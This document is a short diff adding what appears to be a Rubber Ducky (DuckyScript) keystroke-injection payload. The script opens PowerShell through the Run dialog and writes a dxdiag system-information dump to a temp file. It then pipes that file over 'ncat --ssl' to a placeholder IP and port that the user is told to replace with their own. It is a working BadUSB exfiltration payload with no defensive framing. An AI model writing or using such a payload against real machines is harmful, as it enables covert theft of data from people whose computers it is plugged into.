@@ -1,0 +1,21 @@
+REM Change line 16 IP and PORT to your own IP and PORT
+GUI r
+DELAY 500
+DELETE
+DELAY 200
+STRING powershell
+DELAY 100
+ENTER
+DELAY 300
+STRING dxdiag /t $env:TEMP\infins.txt
+DELAY 100
+ENTER
+REM 12 second delay time to complete the dxdiag, since it takes a bit of time
+DELAY 12000
+REM takes dxdiag output and sends it over ncat to specific IP and port
+STRING Get-Content "$env:TEMP\infins.txt" | ncat --ssl IP PORT
+DELAY 100
+ENTER
+DELAY 5000
+STRING exit
+ENTER
